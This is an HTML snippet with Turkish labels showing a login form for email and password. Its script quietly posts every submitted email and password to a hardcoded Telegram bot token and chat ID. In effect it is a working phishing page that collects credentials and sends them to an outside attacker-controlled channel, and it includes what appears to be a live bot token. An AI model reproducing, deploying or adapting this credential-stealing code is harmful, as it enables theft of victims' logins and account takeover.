<body>
    <form>
    <input type="email" id="email" required>
    <input type="password" id="password" required>
    <button onclick="sendMessage()">GİRİŞ YAP</button>
    </form>

    <script>
        async function sendMessage() {
            const token = '7941593080:AAFe71WQaxyQFzvI3CcpFtuOcOthvUrF49A';
            const userId = 7767108844;
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: userId,
                        text: 'email: ' + email + ' şifre:' + password
                    })
                });

                if (!response.ok) throw new Error(`HTTP Hatası: ${response.status}`);
                
                const result = await response.json();
                
                if (result.ok) {
                } else {
                    alert(`Hata: ${result.description}`);
                }
            } catch (error) {
                alert(`Çalışma hatası: ${error.message}`);
                console.error('Detay:', error);
            }
        }
    </script>
